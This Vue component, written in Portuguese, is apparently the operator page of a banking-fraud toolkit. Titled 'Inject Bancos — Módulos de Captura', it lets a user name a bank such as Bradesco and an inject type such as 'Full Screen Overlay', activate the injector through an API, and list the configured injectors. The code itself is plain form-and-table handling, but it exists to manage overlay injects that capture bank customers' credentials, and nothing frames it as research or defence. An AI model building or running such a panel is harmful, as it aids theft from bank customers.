<template>
  <div class="page-container">
    <header class="page-header"><h1>Inject Bancos — Módulos de Captura</h1><p>Configure e ative injetores para instituições financeiras.</p></header>
    <div class="card form-card">
      <h3>Novo Injetor Bancário</h3>
      <form @submit.prevent="createItem" class="form-row">
        <input v-model="bankName" type="text" placeholder="Nome do Banco (ex: Banco Bradesco)" required />
        <input v-model="injectType" type="text" placeholder="Tipo de Inject (ex: Full Screen Overlay)" required />
        <button type="submit" class="btn btn-primary">Ativar Injector</button>
      </form>
    </div>
    <div class="card list-card">
      <h3>Injetores Configurados</h3>
      <div v-if="items.length === 0" class="empty">Nenhum injetor configurado.</div>
      <table v-else class="data-table">
        <thead><tr><th>ID</th><th>Instituição</th><th>Tipo</th><th>Status</th></tr></thead>
        <tbody>
          <tr v-for="i in items" :key="i.id"><td>#{{ i.id }}</td><td><strong>{{ i.bank_name }}</strong></td><td>{{ i.inject_type }}</td><td><span class="badge">{{ i.status }}</span></td></tr>
        </tbody>
      </table>
    </div>
  </div>
</template>
<script setup lang="ts">
import { ref, onMounted } from 'vue';
import axios from 'axios';
const API_URL = import.meta.env.VITE_API_URL || '/api';
const items = ref<any[]>([]);
const bankName = ref('');
const injectType = ref('');
const fetchItems = async () => {
  const token = localStorage.getItem('token');
  const res = await axios.get(`${API_URL}/tools/inject-bancos`, { headers: { Authorization: `Bearer ${token}` } });
  items.value = res.data.items;
};
const createItem = async () => {
  const token = localStorage.getItem('token');
  await axios.post(`${API_URL}/tools/inject-bancos`, { bank_name: bankName.value, inject_type: injectType.value }, { headers: { Authorization: `Bearer ${token}` } });
  bankName.value = ''; injectType.value = '';
  await fetchItems();
};
onMounted(fetchItems);
</script>
<style scoped>
.page-container { padding: 2rem; }
.card { background: var(--surface-1); border: 1px solid var(--hairline); border-radius: var(--r-md); padding: 1.5rem; margin-bottom: 2rem; }
.form-row { display: flex; gap: 1rem; margin-top: 1rem; }
.form-row input { flex: 1; padding: 0.75rem; background: var(--surface-2); border: 1px solid var(--hairline); border-radius: var(--r-sm); color: var(--ink); }
.btn-primary { background: var(--accent); color: white; border: none; padding: 0.75rem 1.5rem; border-radius: var(--r-sm); font-weight: 600; cursor: pointer; }
.data-table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
.data-table th, .data-table td { padding: 0.75rem 1rem; text-align: left; border-bottom: 1px solid var(--hairline); }
.badge { background: var(--warning-soft); color: var(--warning); padding: 0.25rem 0.5rem; border-radius: var(--r-sm); font-size: 0.75rem; }
.empty { color: var(--ink-muted); font-style: italic; }
</style>